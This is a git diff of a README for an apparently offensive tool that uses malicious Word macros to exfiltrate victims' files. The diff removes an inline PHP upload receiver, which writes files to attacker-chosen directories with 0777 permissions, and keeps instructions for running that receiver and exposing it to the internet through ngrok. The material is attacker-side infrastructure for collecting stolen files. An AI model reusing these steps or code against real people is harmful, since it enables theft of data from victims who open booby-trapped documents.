@@ -15,7 +15,7 @@
 
 ## Context
 
-It is well-known that macro is a great vector of to execute malicious code on victim device. The approach is basically to make the victim open an MS document which will run code using Macro.
+It is well-known that macro is a great vector of attack to execute malicious code on victim device. The approach is basically to make the victim open an MS document which will run code using Macro.
 
 Macro are written in VBA which is a precompiled language (⇒ easy to reverse.. argh).
 
@@ -105,23 +105,9 @@ End Sub
 
 ### Receive files on Attacker side
 
-First let's create some files:
-```shell
-mkdir php
-```
+[`php/upload.php`](https://github.com/ariary/TheWordIsYours/blob/main/php/upload.php) is the php file in charge of receiving uploaded file (with `multipart/form-data`).
 
-Now write thephp file in charge of receiving uploaded file (with `multipart/form-data`):
-```php
-// php/upload.php
-<?php
-$base_dir = dirname( __FILE__ ) . '/../Upload/' . $_GET["id"];
-if(!is_dir($base_dir))
-    mkdir($base_dir, 0777);
-move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $base_dir . '/' . $_FILES["uploadfile"]["name"]);
-?>
-```
-
-Now launch your server and expose it (with `ngrok`, for test purpose only):
+Launch the server (from here) and expose it (with `ngrok`, for test purpose only):
 ```shell
 php -S localhost:8080 -t php
 
